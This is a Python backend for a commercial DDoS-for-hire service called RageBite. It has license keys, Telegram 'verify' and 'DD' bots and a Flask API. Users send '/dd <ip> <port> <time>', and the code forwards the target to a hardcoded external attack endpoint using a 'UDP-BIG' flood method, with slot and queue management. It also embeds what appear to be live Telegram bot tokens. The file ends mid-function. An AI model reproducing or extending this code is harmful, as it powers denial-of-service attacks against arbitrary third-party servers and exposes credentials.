"""
⚡ RAGEBITE ALL-IN-ONE BACKEND ⚡
Database + Verify Bot + DD Bot + Flask API + Maintenance System
"""

import sqlite3
import random
import string
import threading
import time
import asyncio
from datetime import datetime, timedelta

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests


# ============================================================
# ⚙️ CONFIGURATION — YAHAN APNE NAYE TOKENS DAALEIN
# ============================================================

# ⚠️ VERIFY BOT TOKEN (@BotFather se NAYA token lein)
VERIFY_BOT_TOKEN = "8823908635:AAHtShV7f7nuYA2Y2BjeqYK5cqYD9TFAT3s"

# ⚠️ DD BOT TOKEN (@BotFather se NAYA token lein)
DD_BOT_TOKEN = "8650600804:AAEjG0LscwdMjClRuMS8fI7nAmShqPyaato"

# ⚠️ APNI TELEGRAM ID (numeric) — @userinfobot se lein
OWNER_ID =  6321758394

# ⚠️ API SECRET (same APK me daalna hai)
API_SECRET = "RAGEBITE_SECRET_2026_CHANGE_ME"

# ⚠️ API PORT
API_PORT = 5000

# Slots limit
MAX_SLOTS = 4

# ============================================================
# 🌐 EXTERNAL ATTACK API
# ============================================================
ATTACK_API_URL = "http://176.100.37.127:3001/api/v1/attack/start"
DEFAULT_METHOD = "UDP-BIG"

# ============================================================


# ============================================================
# 📦 DATABASE
# ============================================================
DB_NAME = 'ragebite.db'

STATUS_ACTIVE = "ACTIVE"
STATUS_EXPIRED = "EXPIRED"
STATUS_DELETED = "DELETED"
STATUS_DISABLED = "DISABLED"


def get_conn():
    return sqlite3.connect(DB_NAME, check_same_thread=False)


def init_db():
    conn = get_conn()
    c = conn.cursor()

    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        key TEXT PRIMARY KEY,
        user_id INTEGER,
        expiry TEXT,
        status TEXT DEFAULT 'ACTIVE',
        created_at TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS slots (
        slot_id INTEGER PRIMARY KEY,
        user_id INTEGER,
        key TEXT,
        package_name TEXT,
        ip TEXT,
        port TEXT,
        time_sec INTEGER,
        start_time TEXT,
        end_time TEXT,
        is_active INTEGER DEFAULT 0
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS queue (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER UNIQUE,
        key TEXT,
        package_name TEXT,
        ip TEXT,
        port TEXT,
        time_sec INTEGER,
        joined_at TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS servers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        ip TEXT,
        port TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS api_keys (
        name TEXT PRIMARY KEY,
        api_key TEXT NOT NULL,
        added_at TEXT,
        is_active INTEGER DEFAULT 1
    )''')

    # 🆕 SETTINGS table (maintenance mode store karta hai)
    c.execute('''CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')

    # Default maintenance = off
    c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)',
              ('maintenance', 'off'))

    for i in range(1, MAX_SLOTS + 1):
        c.execute('INSERT OR IGNORE INTO slots (slot_id, is_active) VALUES (?, 0)', (i,))

    conn.commit()
    conn.close()


# ==================== MAINTENANCE ====================
def is_maintenance_on():
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key='maintenance'")
    row = c.fetchone()
    conn.close()
    return row and row[0] == "on"


def set_maintenance(state):
    conn = get_conn()
    c = conn.cursor()
    c.execute("UPDATE settings SET value=? WHERE key='maintenance'",
              ("on" if state else "off",))
    conn.commit()
    conn.close()


# ==================== KEY MANAGEMENT ====================
def generate_key(user_id, days):
    key = "LTN-1M-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    conn = get_conn()
    c = conn.cursor()
    c.execute('''INSERT INTO keys (key, user_id, expiry, status, created_at)
                 VALUES (?, ?, ?, ?, ?)''',
              (key, user_id, expiry, STATUS_ACTIVE,
               datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()
    return key, expiry


def verify_key(key):
    if is_maintenance_on():
        return None, "MAINTENANCE"

    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT expiry, status FROM keys WHERE key = ?', (key,))
    row = c.fetchone()
    conn.close()
    if not row:
        return None, "NOT_FOUND"
    expiry_str, status = row
    if status == STATUS_DELETED:
        return None, "DELETED"
    if status == STATUS_DISABLED:
        return None, "DISABLED"
    expiry = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    if expiry < datetime.now():
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_EXPIRED, key))
        conn.commit()
        conn.close()
        return None, "EXPIRED"
    return int(expiry.timestamp() * 1000), "VALID"


def is_user_authorized(user_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT key, expiry, status FROM keys WHERE user_id=? ORDER BY created_at DESC LIMIT 1',
              (user_id,))
    row = c.fetchone()
    conn.close()

    if not row:
        return False, None, "NO_KEY"

    key, expiry_str, status = row

    if status == STATUS_DELETED:
        return False, key, "DELETED"
    if status == STATUS_DISABLED:
        return False, key, "DISABLED"

    expiry = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    if expiry < datetime.now():
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_EXPIRED, key))
        conn.commit()
        conn.close()
        return False, key, "EXPIRED"

    return True, key, "VALID"


def delete_key(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_DELETED, key))
    conn.commit()
    conn.close()


def disable_key(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_DISABLED, key))
    conn.commit()
    conn.close()


def enable_key(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_ACTIVE, key))
    conn.commit()
    conn.close()


def get_all_active_user_ids():
    """Sab active users ki Telegram IDs (notifications ke liye)"""
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT DISTINCT user_id FROM keys WHERE status='ACTIVE' AND user_id IS NOT NULL")
    rows = c.fetchall()
    conn.close()
    return [r[0] for r in rows]


# ==================== API KEYS ====================
def add_api_key(name, api_key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO api_keys (name, api_key, added_at, is_active)
                 VALUES (?, ?, ?, 1)''',
              (name, api_key, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()


def delete_api_key(name):
    conn = get_conn()
    c = conn.cursor()
    c.execute('DELETE FROM api_keys WHERE name = ?', (name,))
    conn.commit()
    conn.close()


def get_api_key(name):
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT api_key FROM api_keys WHERE name = ? AND is_active = 1', (name,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


def get_all_api_keys():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT name, api_key, added_at FROM api_keys ORDER BY added_at DESC')
    rows = c.fetchall()
    conn.close()
    return rows


def get_active_api_key():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT api_key FROM api_keys WHERE is_active = 1 ORDER BY added_at DESC LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


# ==================== SLOTS ====================
def get_free_slot():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT slot_id FROM slots WHERE is_active=0 ORDER BY slot_id ASC LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


def allot_slot(user_id, key, package_name, ip, port, time_sec):
    slot_id = get_free_slot()
    if slot_id is None:
        return None
    start = datetime.now()
    end = start + timedelta(seconds=time_sec)
    conn = get_conn()
    c = conn.cursor()
    c.execute('''UPDATE slots SET user_id=?, key=?, package_name=?, ip=?, port=?, time_sec=?,
                 start_time=?, end_time=?, is_active=1 WHERE slot_id=?''',
              (user_id, key, package_name, ip, port, time_sec,
               start.strftime('%Y-%m-%d %H:%M:%S'),
               end.strftime('%Y-%m-%d %H:%M:%S'),
               slot_id))
    conn.commit()
    conn.close()
    return slot_id


def release_slot(slot_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('''UPDATE slots SET user_id=NULL, key=NULL, package_name=NULL,
                 ip=NULL, port=NULL, time_sec=NULL, start_time=NULL,
                 end_time=NULL, is_active=0 WHERE slot_id=?''', (slot_id,))
    conn.commit()
    conn.close()


def get_all_slots():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT * FROM slots ORDER BY slot_id')
    rows = c.fetchall()
    conn.close()
    return rows


def get_expired_slots():
    conn = get_conn()
    c = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute('SELECT slot_id, user_id FROM slots WHERE is_active=1 AND end_time <= ?', (now,))
    rows = c.fetchall()
    conn.close()
    return rows


# ==================== QUEUE ====================
def add_to_queue(user_id, key, package_name, ip, port, time_sec):
    conn = get_conn()
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO queue 
                 (user_id, key, package_name, ip, port, time_sec, joined_at)
                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
              (user_id, key, package_name, ip, port, time_sec,
               datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()


def get_queue_position(user_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT id FROM queue WHERE user_id=?', (user_id,))
    row = c.fetchone()
    if not row:
        conn.close()
        return None
    c.execute('SELECT COUNT(*) FROM queue WHERE id <= ?', (row[0],))
    pos = c.fetchone()[0]
    conn.close()
    return pos


def pop_next_from_queue():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT * FROM queue ORDER BY id ASC LIMIT 1')
    row = c.fetchone()
    if row:
        c.execute('DELETE FROM queue WHERE id=?', (row[0],))
        conn.commit()
    conn.close()
    return row


def get_queue_count():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM queue')
    count = c.fetchone()[0]
    conn.close()
    return count


# ==================== SERVERS ====================
def add_server(name, ip, port):
    conn = get_conn()
    c = conn.cursor()
    c.execute('INSERT INTO servers (name, ip, port) VALUES (?, ?, ?)', (name, ip, port))
    conn.commit()
    conn.close()


def get_random_server():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT ip, port FROM servers ORDER BY RANDOM() LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row


def get_all_servers():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT name, ip, port FROM servers')
    rows = c.fetchall()
    conn.close()
    return rows


init_db()


# ============================================================
# 🌐 EXTERNAL ATTACK API CALL
# ============================================================
def call_external_attack_api(ip, port, time_sec, method=None):
    if method is None:
        method = DEFAULT_METHOD
    api_key = get_active_api_key()
    if not api_key:
        return False, "No API key configured!"

    params = {"key": api_key, "ip": ip, "port": port, "time": time_sec, "method": method}

    try:
        print(f"🎯 External API: {ip}:{port} for {time_sec}s")
        response = requests.get(ATTACK_API_URL, params=params, timeout=15)
        print(f"📡 Response: {response.status_code}")

        if response.status_code == 200:
            try:
                data = response.json()
                if isinstance(data, dict):
                    status = data.get("status", "unknown")
                    if status in ["success", "started", "ok", "attacking"]:
                        return True, f"Started: {data.get('message', 'Success')}"
                    return False, f"API said: {status}"
                return True, "Attack started"
            except:
                return True, response.text[:100]
        return False, f"HTTP {response.status_code}"

    except requests.exceptions.Timeout:
        return False, "API Timeout"
    except requests.exceptions.ConnectionError:
        return False, "Connection Error"
    except Exception as e:
        return False, f"Error: {str(e)}"


# ============================================================
# 📢 NOTIFY ALL USERS
# ============================================================
async def notify_all_users_maintenance(is_on, context):
    user_ids = get_all_active_user_ids()

    if is_on:
        msg = (
            "🔧 *MAINTENANCE MODE ON*\n\n"
            "RageBite server temporarily maintenance pe hai.\n"
            "Attack services abhi available nahi hain.\n\n"
            "⏳ Please wait for further notice."
        )
    else:
        msg = (
            "✅ *MAINTENANCE COMPLETE*\n\n"
            "RageBite server ab normal hai.\n"
            "Aap attack services use kar sakte hain.\n\n"
            "🚀 Enjoy!"
        )

    sent = 0
    failed = 0
    for uid in user_ids:
        try:
            await context.bot.send_message(chat_id=uid, text=msg, parse_mode='Markdown')
            sent += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            failed += 1

    print(f"📢 Maintenance notify: {sent} sent, {failed} failed")
    return sent, failed


# ============================================================
# 🛡️ VERIFY BOT
# ============================================================
async def v_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    is_owner = update.effective_user.id == OWNER_ID

    if is_maintenance_on() and not is_owner:
        await update.message.reply_text(
            "🔧 *MAINTENANCE MODE*\n\n"
            "RageBite server temporarily maintenance pe hai.\n\n"
            "⏳ Please try again later.",
            parse_mode='Markdown'
        )
        return

    msg = (
        "🛡️ *RAGEBITE VERIFY BOT* 🛡️\n\n"
        "`/verify <key>` — Verify key\n"
        "`/mykey` — Your key info\n"
    )
    if is_owner:
        msg += (
            "\n👑 *Owner:*\n"
            "`/genkey <user_id> <days>`\n"
            "`/delkey <key>` | `/diskey <key>` | `/enkey <key>`\n"
            "`/listkeys` | `/maintenance on|off` | `/slotson`"
        )
    await update.message.reply_text(msg, parse_mode='Markdown')


async def v_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("INVALID|NoKey")
        return
    key = context.args[0]
    expiry, status = verify_key(key)
    if status == "VALID":
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT user_id FROM keys WHERE key = ?', (key,))
        row = c.fetchone()
        if row and row[0] != user_id:
            c.execute('UPDATE keys SET user_id = ? WHERE key = ?', (user_id, key))
            conn.commit()
        conn.close()
        await update.message.reply_text(f"VALID|{expiry}")
    else:
        await update.message.reply_text(f"INVALID|{status}")


async def v_mykey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT key, expiry, status FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        await update.message.reply_text("❌ No key found.")
        return
    await update.message.reply_text(
        f"🔑 *Key Info*\n\nKey: `{row[0]}`\nExpiry: {row[1]}\nStatus: `{row[2]}`",
        parse_mode='Markdown'
    )


async def v_genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Only Owner!")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: `/genkey <user_id> <days>`", parse_mode='Markdown')
        return
    try:
        target = int(context.args[0])
        days = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid args")
        return

    if days < 1 or days > 3650:
        await update.message.reply_text("❌ Days must be 1-3650")
        return

    key, expiry = generate_key(target, days)
    await update.message.reply_text(
        f"✅ *Key Generated*\n\nUser: `{target}`\nKey: `{key}`\nExpiry: {expiry}",
        parse_mode='Markdown'
    )
    try:
        await context.bot.send_message(
            chat_id=target,
            text=f"🎉 *Your Key*\n\n🔑 `{key}`\n📅 Valid till: {expiry}\n\n"
                 f"Ab DD bot me `/dd <ip> <port> <time>` bhej sakte hain.",
            parse_mode='Markdown'
        )
    except:
        pass


async def v_delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    delete_key(context.args[0])
    await update.message.reply_text(f"🗑️ Deleted: `{context.args[0]}`", parse_mode='Markdown')


async def v_diskey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    disable_key(context.args[0])
    await update.message.reply_text(f"⛔ Disabled: `{context.args[0]}`", parse_mode='Markdown')


async def v_enkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    enable_key(context.args[0])
    await update.message.reply_text(f"✅ Enabled: `{context.args[0]}`", parse_mode='Markdown')


async def v_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Only Owner!")
        return

    if not context.args:
        status = "🔧 ON" if is_maintenance_on() else "✅ OFF"
        await update.message.reply_text(
            f"*Current Maintenance:* {status}\n\n"
            f"*Usage:*\n"
            f"`/maintenance on` — Turn ON\n"
            f"`/maintenance off` — Turn OFF\n"
            f"`/maintenance status` — Check",
            parse_mode='Markdown'
        )
        return

    action = context.args[0].lower()

    if action == "on":
        if is_maintenance_on():
            await update.message.reply_text("⚠️ Already ON")
            return
        set_maintenance(True)
        await update.message.reply_text(
            "🔧 *MAINTENANCE MODE ON*\n\n"
            "Sab users ko notify kiya ja raha hai...",
            parse_mode='Markdown'
        )
        sent, failed = await notify_all_users_maintenance(True, context)
        await update.message.reply_text(
            f"📢 Notify sent: {sent} ✅ | Failed: {failed} ❌",
            parse_mode='Markdown'
        )

    elif action == "off":
        if not is_maintenance_on():
            await update.message.reply_text("⚠️ Already OFF")
            return
        set_maintenance(False)
        await update.message.reply_text(
            "✅ *MAINTENANCE MODE OFF*\n\n"
            "Sab users ko notify kiya ja raha hai...",
            parse_mode='Markdown'
        )
        sent, failed = await notify_all_users_maintenance(False, context)
        await update.message.reply_text(
            f"📢 Notify sent: {sent} ✅ | Failed: {failed} ❌",
            parse_mode='Markdown'
        )

    elif action == "status":
        status = "🔧 ON" if is_maintenance_on() else "✅ OFF"
        await update.message.reply_text(f"*Maintenance:* {status}", parse_mode='Markdown')

    else:
        await update.message.reply_text("Usage: `/maintenance <on|off|status>`", parse_mode='Markdown')


async def v_listkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT key, user_id, expiry, status FROM keys ORDER BY created_at DESC LIMIT 20')
    rows = c.fetchall()
    conn.close()
    msg = "📋 *Recent Keys:*\n\n"
    for k in rows:
        msg += f"`{k[0]}` — User `{k[1]}` | {k[3]}\n"
    await update.message.reply_text(msg or "❌ None", parse_mode='Markdown')


async def v_slotson(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    slots = get_all_slots()
    msg = "📊 *LIVE SLOTS*\n\n"
    active = 0
    for s in slots:
        slot_id, user_id, key, pkg, ip, port, tsec, start, end, act = s
        if act:
            active += 1
            rem = (datetime.strptime(end, '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
            msg += f"🔴 *#{slot_id}* BUSY — User `{user_id}` | {ip}:{port} | {rem}s\n"
        else:
            msg += f"🟢 *#{slot_id}* FREE\n"
    msg += f"\n📈 Active: {active}/{len(slots)} | Queue: {get_queue_count()}"
    await update.message.reply_text(msg, parse_mode='Markdown')


# ============================================================
# ⚔️ DD BOT
# ============================================================
async def d_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if is_maintenance_on() and user_id != OWNER_ID:
        await update.message.reply_text(
            "🔧 *MAINTENANCE MODE*\n\nServer temporarily maintenance pe hai.\n⏳ Please wait...",
            parse_mode='Markdown'
        )
        return

    authorized, key, reason = is_user_authorized(user_id)

    if not authorized:
        msg = "🚫 *ACCESS DENIED*\n\n"
        if reason == "NO_KEY":
            msg += (
                "❌ Aapke paas koi valid key nahi hai.\n\n"
                "📝 *Steps:*\n"
                "1️⃣ Owner se key lein\n"
                "2️⃣ APK me login karein\n"
                "3️⃣ Fir `/dd` use karein"
            )
        elif reason == "EXPIRED":
            msg += f"⏰ Key *expired*: `{key}`\n\nContact Owner."
        elif reason == "DELETED":
            msg += f"🗑️ Key *deleted*: `{key}`\n\nContact Owner."
        elif reason == "DISABLED":
            msg += f"⛔ Key *disabled*: `{key}`\n\nContact Owner."
        else:
            msg += f"❌ Reason: `{reason}`"

        await update.message.reply_text(msg, parse_mode='Markdown')
        return

    await update.message.reply_text(
        f"⚔️ *RAGEBITE DD BOT* ⚔️\n\n"
        f"✅ *Verified*\n"
        f"🔑 Key: `{key[:15]}...`\n\n"
        f"`/dd <ip> <port> <time>` — Attack\n"
        f"`/slots` — Slot status\n"
        f"`/mykey` — Your key info",
        parse_mode='Markdown'
    )


async def d_dd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Maintenance check
    if is_maintenance_on() and user_id != OWNER_ID:
        await update.message.reply_text(
            "🔧 *SERVER UNDER MAINTENANCE*\n\nAttack services temporarily unavailable.",
            parse_mode='Markdown'
        )
        return

    # Authorization check
    authorized, key, reason = is_user_authorized(user_id)
    if not authorized:
        if reason == "NO_KEY":
            await update.message.reply_text(
                "🚫 *ACCESS DENIED*\n\nKoi valid key nahi hai. Owner se contact karein.",
                parse_mode='Markdown'
            )
        elif reason == "EXPIRED":
            await update.message.reply_text(
                f"⏰ *KEY EXPIRED*\n\nKey: `{key}`\n\nOwner se renew karwayein.",
                parse_mode='Markdown'
            )
        elif reason == "DELETED":
            await update.message.reply_text(f"🗑️ Key deleted. Owner se contact.", parse_mode='Markdown')
        elif reason == "DISABLED":
            await update.message.reply_text(f"⛔ Key disabled. Owner se contact.", parse_mode='Markdown')
        else:
            await update.message.reply_text(f"🚫 Unauthorized: `{reason}`", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "❌ *Format:* `/dd <ip> <port> <time>`\n"
            "Example: `/dd 34.0.14.146 29990 30`\n"
            "⏱️ Time: 10-300s",
            parse_mode='Markdown'
        )
        return

    ip, port, time_str = args
    try:
        time_sec = int(time_str)
        if time_sec < 10 or time_sec > 300:
            await update.message.reply_text("❌ Time must be 10-300 seconds")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid time")
        return

    # Check if user already has active slot
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT slot_id FROM slots WHERE user_id=? AND is_active=1', (user_id,))
    existing = c.fetchone()
    conn.close()
    if existing:
        await update.message.reply_text(
            f"⚠️ Aapka slot #{existing[0]} already active hai!\nWait karein.",
            parse_mode='Markdown'
        )
        return

    slot_id = allot_slot(user_id, key, "unknown", ip, port, time_sec)

    if slot_id is None:
        add_to_queue(user_id, key, "unknown", ip, port, time_sec)
        pos = get_queue_position(user_id)
        await update.message.reply_text(
            f"⚠️ *ALL 4 SLOTS FULL*\n\n📋 Queue: *{pos}*",
            parse_mode='Markdown'
        )
        return

    await update.message.reply_text(
        f"⚡ *Slot #{slot_id} Allotted!*\n🎯 Starting attack...",
        parse_mode='Markdown'
    )

    loop = asyncio.get_event_loop()

    def call_api():
        success, message = call_external_attack_api(ip, port, time_sec)
        if success:
            end_time = (datetime.now() + timedelta(seconds=time_sec)).strftime('%H:%M:%S')
            text = (
                f"✅ *ATTACK STARTED*\n\n"
                f"🎯 Slot: #{slot_id}\n"
                f"🌐 IP: `{ip}`\n"
                f"🔌 Port: `{port}`\n"
                f"⏱️ Time: {time_sec}s\n"
                f"📡 Method: UDP-BIG\n"
                f"🕐 Ends at: {end_time}"
            )
        else:
            text = f"❌ *ATTACK FAILED*\n\n📝 `{message}`"
            release_slot(slot_id)

        try:
            asyncio.run_coroutine_threadsafe(
                context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=text,
                    parse_mode='Markdown'
                ),
                loop
            )
        except Exception as e:
            print(f"Reply error: {e}")

    threading.Thread(target=call_api, daemon=True).start()


async def d_slots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    slots = get_all_slots()
    msg = "📊 *SLOTS*\n\n"
    for s in slots:
        if s[9] == 1:
            rem = (datetime.strptime(s[8], '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
            msg += f"🔴 Slot #{s[0]}: {rem}s left\n"
        else:
            msg += f"🟢 Slot #{s[0]}: FREE\n"
    msg += f"\n📋 Queue: {get_queue_count()}"
    await update.message.reply_text(msg, parse_mode='Markdown')


async def d_getip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if is_maintenance_on() and user_id != OWNER_ID:
        await update.message.reply_text("🔧 Maintenance")
        return

    authorized, key, reason = is_user_authorized(user_id)
    if not authorized:
        await update.message.reply_text(f"🚫 Access denied: {reason}")
        return

    row = get_random_server()
    if row:
        await update.message.reply_text(f"{row[0]}|{row[1]}")
    else:
        await update.message.reply_text("ERROR|NoServer")


# ==================== OWNER COMMANDS ====================
async def d_addapikey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: `/addapikey <name> <key>`", parse_mode='Markdown')
        return
    name = context.args[0].lower()
    api_key = context.args[1]
    add_api_key(name, api_key)
    await update.message.reply_text(
        f"✅ Added `{name}`\nKey: `{api_key[:20]}...`",
        parse_mode='Markdown'
    )


async def d_delapikey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    name = context.args[0].lower()
    if not get_api_key(name):
        await update.message.reply_text(f"❌ `{name}` not found")
        return
    delete_api_key(name)
    await update.message.reply_text(f"🗑️ Deleted `{name}`", parse_mode='Markdown')


async def d_listapikeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    rows = get_all_api_keys()
    if not rows:
        await update.message.reply_text("📭 No API keys")
        return
    msg = f"🔑 *API Keys ({len(rows)})*\n\n"
    for i, r in enumerate(rows, 1):
        msg += f"*{i}. {r[0]}*\n`{r[1][:20]}...{r[1][-8:]}`\n\n"
    await update.message.reply_text(msg, parse_mode='Markdown')


async def d_addserver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or len(context.args) != 3:
        return
    add_server(*context.args)
    await update.message.reply_text(f"✅ Server added: {context.args[0]}")


async def d_listservers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rows = get_all_servers()
    if not rows:
        await update.message.reply_text("❌ No servers")
        return
    msg = "🌐 *Servers:*\n\n"
    for i, r in enumerate(rows, 1):
        msg += f"{i}. {r[0]}: `{r[1]}:{r[2]}`\n"
    await update.message.reply_text(msg, parse_mode='Markdown')


# ============================================================
# 🔄 AUTO-RELEASE LOOP
# ============================================================
async def auto_release_loop_dd(application):
    while True:
        try:
            for slot_id, user_id in get_expired_slots():
                release_slot(slot_id)
                try:
                    await application.bot.send_message(
                        user_id,
                        f"⏰ *Time Over!*\nSlot #{slot_id} is free.",
                        parse_mode='Markdown'
                    )
                except:
                    pass

                nxt = pop_next_from_queue()
                if nxt:
                    _, uid, k, pkg, ip, port, t, _ = nxt
                    authorized, kk, reason = is_user_authorized(uid)
                    if not authorized:
                        try:
                            await application.bot.send_message(
                                uid,
                                f"❌ Authorization failed: `{reason}`",
                                parse_mode='Markdown'
                            )
                        except:
                            pass
                        continue

                    new_slot = allot_slot(uid, kk, pkg, ip, port, t)
                    if new_slot:
                        try:
                            await application.bot.send_message(
                                uid,
                                f"🎉 *SLOT #{new_slot}!*\n🌐 `{ip}:{port}`\n⏱️ {t}s",
                                parse_mode='Markdown'
                            )
                            call_external_attack_api(ip, port, t)
                        except:
                            pass
        except Exception as e:
            print(f"Auto-release: {e}")
        await asyncio.sleep(5)


async def dd_post_init(application):
    asyncio.create_task(auto_release_loop_dd(application))


# ============================================================
# 🌐 FLASK API
# ============================================================
flask_app = Flask(__name__)
CORS(flask_app)


def check_auth():
    return request.headers.get('X-API-KEY') == API_SECRET


def notify_owner_dd(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{DD_BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_ID, "text": text, "parse_mode": "Markdown"},
            timeout=5
        )
    except:
        pass


@flask_app.route('/api/verify', methods=['POST'])
def api_verify():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    expiry, status = verify_key(data.get('key', ''))
    if status == "VALID":
        return jsonify({"status": "VALID", "expiry": expiry})
    return jsonify({"status": "INVALID", "reason": status})


@flask_app.route('/api/slots', methods=['GET'])
def api_slots():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401
    rows = get_all_slots()
    slots = []
    for r in rows:
        if r[9]:
            rem = (datetime.strptime(r[8], '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
            slots.append({"slot": r[0], "status": "BUSY", "remaining": rem})
        else:
            slots.append({"slot": r[0], "status": "FREE", "remaining": 0})
    return jsonify({"slots": slots, "queue_count": get_queue_count(), "max_slots": MAX_SLOTS})


@flask_app.route('/api/getip', methods=['POST'])
def api_getip():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    expiry, status = verify_key(data.get('key', ''))
    if status != "VALID":
        return jsonify({"status": "ERROR", "reason": status})
    row = get_random_server()
    if row:
        return jsonify({"status": "OK", "ip": row[0], "port": row[1]})
    return jsonify({"status": "ERROR", "reason": "NoServer"})


@flask_app.route('/api/start', methods=['POST'])
def api_start():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    user_id = data.get('user_id')
    key = data.get('key')
    pkg = data.get('package', 'unknown')
    ip = data.get('ip')
    port = data.get('port')
    time_sec = int(data.get('time', 60))

    if not all([user_id, key, ip, port]):
        return jsonify({"status": "ERROR", "reason": "MissingFields"})

    expiry, status = verify_key(key)
    if status != "VALID":
        return jsonify({"status": "ERROR", "reason": status})

    slot_id = allot_slot(user_id, key, pkg, ip, port, time_sec)

    if slot_id:
        end = datetime.now() + timedelta(seconds=time_sec)
